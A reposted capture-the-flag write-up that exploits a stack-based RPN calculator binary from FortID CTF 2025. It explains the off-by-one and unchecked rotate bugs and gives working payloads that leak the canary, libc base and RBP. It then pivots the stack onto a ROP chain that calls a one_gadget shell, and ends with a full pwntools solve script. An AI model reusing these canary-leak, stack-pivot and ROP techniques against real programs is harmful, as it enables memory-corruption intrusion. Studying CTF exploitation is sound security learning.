# :skull: Reverse Polish Pwn Writeup | FortID CTF 2025

> **Original Source:** [Reverse Polish Pwn Writeup | FortID CTF 2025](https://infosecwriteups.com/reverse-polish-pwn-writeup-fortid-ctf-2025-0022398d5b84)
> **Platform:** infosecwriteups.com | **Category:** `PWN` | **Year:** 2025

---

# Reverse Polish Pwn Writeup | FortID CTF 2025


— Keywords: pwn, limited buffer overflow, stack pivot, ROP


This challenge took me 1.5 days to complete, it was all worth it when I got the flag.


First let’s check what mitigations this binary has:


Now let’s get to analyzing the source code for any vulnerabilites.


```
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <ctype.h>

#define STACK_MAX 65

typedef struct {
int sp;
int data[STACK_MAX];
} Stack;

void msg(const char *msg) {
fprintf(stderr, "error: %s\n", msg);
}

int need(Stack *s, int n) {
if(s->sp < n) {
msg("stack underflow");
return 1;
}
return 0;
}

int push(Stack *s, int v) {
if(s->sp > STACK_MAX) {
msg("stack overflow");
return 1;
}
s->data[s->sp++] = v;
return 0;
}

int popv(Stack *s) {
return s->data[--s->sp];
}

int process_line(char *line) {
Stack st;
st.sp = 0;
char *tok = strtok(line, " \t\r\n");
static char cmd[32];
while (tok) {
strncpy(cmd, tok, 32);
cmd[31]=0;
if (!strcmp(cmd,"push")) {
char *num = strtok(NULL, " \t\r\n");
if (!num) {
msg("push needs a number");
return 1;
}
char *end;
long v = strtol(num, &end, 10);
if (*end) {
msg("invalid integer");
return 1;
}
if (push(&st, (int)v))
return 1;
} else if (!strcmp(cmd,"pop")) {
if (need(&st,1))
return 1;
printf("%d\n", popv(&st));
} else if (!strcmp(cmd,"add")) {
if (need(&st,2))
return 1;
int b=popv(&st);
int a=popv(&st);
if (push(&st, a+b))
return 1;
} else if (!strcmp(cmd,"sub")) {
if (need(&st,2))
return 1;
int b=popv(&st);
int a=popv(&st);
if (push(&st, a-b))
return 1;
} else if (!strcmp(cmd,"rot")) { // (x1 x2 x3 -- x2 x3 x1)
if (need(&st,3))
return 1;
int x1 = st.data[st.sp-1];
int x2 = st.data[st.sp];
int x3 = st.data[st.sp+1];
st.data[st.sp-1] = x2;
st.data[st.sp] = x3;
st.data[st.sp+1] = x1;
} else if (!strcmp(cmd,"dup")) {
if (need(&st,1))
return 1;
if (push(&st, st.data[st.sp-1]))
return 1;
} else {
msg("unknown command");
return 1;
}
tok = strtok(NULL, " \t\r\n");
}
return 0;
}

void rpn_loop() {
char line[1024];
printf("RPN> ");
while (fgets(line, sizeof line, stdin)) {
if (process_line(line)) {
return ;
}
printf("RPN> ");
}
}

int main(void){
setbuf(stdin, NULL);
setbuf(stdout, NULL);
char help[] =
"RPN calculator commands:\n"
" push <num> - push number onto stack\n"
" pop - pop number from stack and print it\n"
" add - pop two numbers, add them, push result\n"
" sub - pop two numbers, subtract second from first, push result\n"
" dup - duplicate top stack value\n"
" rot - rotate top three stack values\n";
printf("%s", help);
rpn_loop();
printf("Bye\n");
return 0;
}
```


Clearly these are the functions we need to pay attention to:


```
#define STACK_MAX 65

typedef struct {
int sp;
int data[STACK_MAX];
} Stack;

int need(Stack *s, int n) {
if(s->sp < n) {
msg("stack underflow");
return 1;
}
return 0;
}

int push(Stack *s, int v) {
if(s->sp > STACK_MAX) {
msg("stack overflow");
return 1;
}
s->data[s->sp++] = v;
return 0;
}

int popv(Stack *s) {
return s->data[--s->sp];
}

int process_line(char *line) {
Stack st;
st.sp = 0;
char *tok = strtok(line, " \t\r\n");
static char cmd[32];
while (tok) {
strncpy(cmd, tok, 32);
cmd[31]=0;
if (!strcmp(cmd,"push")) {
char *num = strtok(NULL, " \t\r\n");
if (!num) {
msg("push needs a number");
return 1;
}
char *end;
long v = strtol(num, &end, 10);
if (*end) {
msg("invalid integer");
return 1;
}
if (push(&st, (int)v))
return 1;
} else if (!strcmp(cmd,"pop")) {
if (need(&st,1))
return 1;
printf("%d\n", popv(&st));
} else if (!strcmp(cmd,"add")) {
if (need(&st,2))
return 1;
int b=popv(&st);
int a=popv(&st);
if (push(&st, a+b))
return 1;
} else if (!strcmp(cmd,"sub")) {
if (need(&st,2))
return 1;
int b=popv(&st);
int a=popv(&st);
if (push(&st, a-b))
return 1;
} else if (!strcmp(cmd,"rot")) { // (x1 x2 x3 -- x2 x3 x1)
if (need(&st,3))
return 1;
int x1 = st.data[st.sp-1];
int x2 = st.data[st.sp];
int x3 = st.data[st.sp+1];
st.data[st.sp-1] = x2;
st.data[st.sp] = x3;
st.data[st.sp+1] = x1;
} else if (!strcmp(cmd,"dup")) {
if (need(&st,1))
return 1;
if (push(&st, st.data[st.sp-1]))
return 1;
} else {
msg("unknown command");
return 1;
}
tok = strtok(NULL, " \t\r\n");
}
return 0;
}
```


In this code there are 2 vulnerabilities:


```
int push(Stack *s, int v) {
if(s->sp > STACK_MAX) { // STACK_MAX = 65
msg("stack overflow");
return 1;
}
s->data[s->sp++] = v;
return 0;
}
```


In this implementation, the comparison should be with greater than or equal. The problem with the current way its done is that if sp = 65 it will still pass the check and perform an OOB write.


Recall that s->data is an array with 65 elements whose indexing starts at 0, so data[65] is OOB.


This also allows sp to be equal to 66, which we’ll see later allows to us to do even more evil shenanigans.


```
else if (!strcmp(cmd,"rot")) { // (x1 x2 x3 -- x2 x3 x1)
if (need(&st,3))
return 1;
int x1 = st.data[st.sp-1];
int x2 = st.data[st.sp];
int x3 = st.data[st.sp+1];
st.data[st.sp-1] = x2;
st.data[st.sp] = x3;
st.data[st.sp+1] = x1;
```


Now here’s the second vulnerability: This ‘rot’ commands has no upper bounds check at all, it only checks for the lower bounds with the need function. Our exploit relies mostly on this error as this function chained with the previous mistake allows us to have an OOB read and write up to the lower 4 bytes of RBP.


We have reviewed all the vulns there are here, let’s get to planning our exploit.


Our exploit will have 3 stages :


- Leak the canary

- Leak a libc address

- Leak RBP’s lower four bytes

- Overwrite RBP’s lower four bytes to point to our input which contains a ROP chain


Overwriting RBP’s lower four bytes is enough because the upper bytes will be the same in the place where we will want to be (We will still be in the stack)


The first thing I set out to do when completing this challenge is making a read primitive that gets me the content of the next 2 elements in the array without overwriting them (This is very important to preserve the canary).


Here is what I landed on:


```
# leaks the immediate next address in 2 stages: 1) first 4 bytes 2) last 4 bytes
payload = b"push 1 "*65 + b"pop rot rot dup dup pop rot rot dup pop rot pop pop"
```


To understand this we’ll first need to understand precisely what each instruction does.


- push <int>: pushes an int to the stack and then increments sp

- pop: decrements sp and then prints data[sp]

- dup: pushes the top element to the stack again

- sub, add: Not needed for this exploit

- rot: exchanges the value of the top of the stack with the 2 elements ahead of it in this order: (x1 x2 x3 → x2 x3 x1) with x1 being the current top of the stack.


This stack implementation is inconsistent and that is what allows us to get OOB reads and writes (although limited in how far we can go).


This inconsistency allows to get a 12 bytes OOB read and write with the rot command. It is enough to: 1. leak the canary, 2. leak the 4 lower bytes of RBP, 3. Overwrite those 4 bytes to point to somewhere we control.


Now onto our first payload!


We first push 65 elements to the stack to reach the end of our buffer. And then I pop the stack to get a good starting point


*This is the how the stack looks like after the pop*


The four boxes are the last 2 elements of the array + 2 OOB elements (So 4 bytes each). Their values are reflected AFTER the instruction on the right has been executed.


## Get suleif’s stories in your inbox


Join Medium for free to get updates from this writer.


Remember me for faster sign in


C1 is the lower 4 bytes of the OOB address, C2 is the higher 4 bytes.


We first perform 2 rots to bring C1 to our buffer. In order to print the value of something in the stack and be able to recover its value We need to dup it, that is the reason I brought C1 to index 63 instead of 64.


This double dup will set the stack nicely for us.


This prints C1 to the terminal


We bring C2 back to the buffer to do the same thing we did to C1.


Prints C2 to the terminal


Fixes back the canary and brings us back to the buffer. The last 2 pops are unnecessary but I left them in for good measure.


Note that this payload can be used to print any address that’s OOB not just the canary.


```
def leak_next_dword(io, payload):
# leaks the immediate next address in 2 stages: 1) first 4 bytes 2) last 4 bytes
payload += f"pop rot rot dup dup pop rot rot dup pop rot pop pop".encode()
send_cmd(io, payload)
err = io.recvline() # for the first pop
if (err == b'error: stack overflow\n'):
return (0, 0, 0)
first_half_raw = int(io.recvline().strip())
second_half_raw = int(io.recvline().strip())
first_half = ctypes.c_uint32(first_half_raw).value
second_half =ctypes.c_uint32(second_half_raw).value
address = first_half + (second_half << 32)
return (address, first_half_raw, second_half_raw)

def fill_buffer(x):
payload = b""
for i in range(x):
payload += f"push {i} ".encode()
return payload

canary, c1, c2 = leak_next_dword(io, fill_buffer(65))

```


This is how I coded it in python. I used ctypes uint32 due to the fact these addresses are getting treated as ints when they should not.


Next we should leak a libc address, In order to find the offset I examined what the data array contained when it was still uninitialized with GDB.


The 4th address is what I chose to use:


To calculate how much we need to fill the buffer just calculate how much you need to stop right before the address you’re trying to leak. In this case it is 13.


```
libc_leak, _, _ = leak_next_dword(io, fill_buffer(13))
info(hex(libc_leak))
```


Then we need to calculate the base address of libc:


First let’s get the offset of the address we leaked relative to the address of __printf


*addresses changed cuz I restarted the binary and ASLR (oops)*


```
libc.address = libc_leak - libc.symbols["__printf"] - 0xA6
success(f"libc address: {hex(libc.address)}")
```


Perfect! Now all we must leak RBP’s lower 4 bytes.


```
ebp_leak_payload = fill_buffer(65) + f"push {c1} rot rot pop rot rot push {c1} rot rot pop rot rot pop rot rot".encode()
```


This payload is almost the same as the one we use to leak OOB addresses the only difference here is I made to sure preserve the canary’s value. If the canary gets corrupted the program crashes.


```
send_cmd(io, ebp_leak_payload)
ebp_value = ctypes.c_uint32(int(io.recvline().strip())).value
```


Now we need to calculate where our next buffer will be at


```
buffer_address = ebp_value - 0x1E0 + 0x10
```


I mainly got this from calculating offsets with gdb. ebp_value — 0x1E0 is where our next input will be, 0x10 is where our rop chain will be in that input.


```
one_gadget = libc.address + 0x4f29e
rop_chain = p64(0) + p64(canary) + b"B"* 8 + p64(one_gadget)
```


For our rop chain: We begin by writing 8 null bytes to 1. end the ‘input’ string 2. align the stack. Then we write the canary because the program checks for it at rbp-8, RBP will be pointing to the Bs and RIP will be pointing to our one_gadget.


```
0x4f29e execve("/bin/sh", rsp+0x40, environ)
constraints: address rsp+0x50 is writable
rsp & 0xf == 0
rcx == NULL || {rcx, "-c", r12, NULL} is a valid argv
```


This is the gadget I chose to use.


```
rbp_overwrite_payload = fill_buffer(65) + f"push {c1} rot rot pop push {buffer_address} rot ".encode() + rop_chain
send_cmd(io, rbp_overwrite_payload)
success("corrupted rbp")
```


An important thing about our payload: I added three spaces after rot to pad the last dword in order to line up our input nicely.


*Look at the last 3 0x20s these are the spaces we added*


```
send_cmd(io, b"triggering!")
```


And finally we send an invalid command to make the program exit and reach those leave ret instructions ! This gives a shell which we can use to read the flag.


Please note that this exploit doesn’t work every time. Some times the stack is misaligned and it will mess up the ROP chain, as shown below:


The exploit is mostly reliable, from my experience it works two out of three times.


*FLAG!*


```
FortID{0v3rwrit1ng_5t4ck_b1t5_is_d15a5t3r_3v3n_4_l1ttl3}
```


Kudos to the author of this challenge! It was a fun one to solve.


Solve script:


```
#!/usr/bin/env python3

from pwn import *
import ctypes

exe = ELF("./chall_patched")
libc = ELF("./libc.so.6")
ld = ELF("./ld-2.27.so")

context.binary = exe

gs2 = '''
b *rpn_loop+55
c
'''

def conn():
if args.LOCAL:
io = process([exe.path])
#if args.GDB:
# io = gdb.debug(exe.path, gdbscript=gs2)
else:
io = remote("0.cloud.chals.io", 11342)

return io

def send_cmd(io, cmd):
io.sendlineafter(b"RPN> ", cmd)

def leak_next_dword(io, payload):
# leaks the immediate next address in 2 stages: 1) first 4 bytes 2) last 4 bytes
payload += f"pop rot rot dup dup pop rot rot dup pop rot pop pop".encode()
send_cmd(io, payload)
err = io.recvline() # for the first pop
if (err == b'error: stack overflow\n'):
return (0, 0, 0)
first_half_raw = int(io.recvline().strip())
second_half_raw = int(io.recvline().strip())
first_half = ctypes.c_uint32(first_half_raw).value
second_half =ctypes.c_uint32(second_half_raw).value
address = first_half + (second_half << 32)
return (address, first_half_raw, second_half_raw)

def fill_buffer(x):
payload = b""
for i in range(x):
payload += f"push {i} ".encode()
return payload

def main():
io = conn()

canary, c1, c2 = leak_next_dword(io, fill_buffer(65))
success(f"canary leak: {hex(canary)}")

libc_leak, _, _ = leak_next_dword(io, fill_buffer(13))
libc.address = libc_leak - libc.symbols["__printf"] - 0xA6
success(f"libc address: {hex(libc.address)}")

ebp_leak_payload = fill_buffer(65) + f"push {c1} rot rot pop rot rot push {c1} rot rot pop rot rot pop rot rot".encode()
send_cmd(io, ebp_leak_payload)
ebp_value = ctypes.c_uint32(int(io.recvline().strip())).value
buffer_address = ebp_value - 0x1E0 + 0x10
success(f"ebp: {hex(ebp_value)}")
success(f"buffer address: {hex(buffer_address)}")
success("leaked ebp")

ret = libc.address + 0x1e6904
one_gadget = libc.address + 0x4f29e
rop_chain = p64(0) + p64(canary) + b"B"* 8 + p64(one_gadget)
rbp_overwrite_payload = fill_buffer(65) + f"push {c1} rot rot pop push {buffer_address} rot ".encode() + rop_chain
send_cmd(io, rbp_overwrite_payload)
success("corrupted rbp")
send_cmd(io, b"triggering!")

io.interactive()


if __name__ == "__main__":
main()
```

---

*Originally published on [Medium](https://infosecwriteups.com/reverse-polish-pwn-writeup-fortid-ctf-2025-0022398d5b84). All credit goes to the original author.*
*Part of [CTF Collection](https://github.com/Hope0351/CTF-collection) — a curated archive of pwn CTF writeups.*
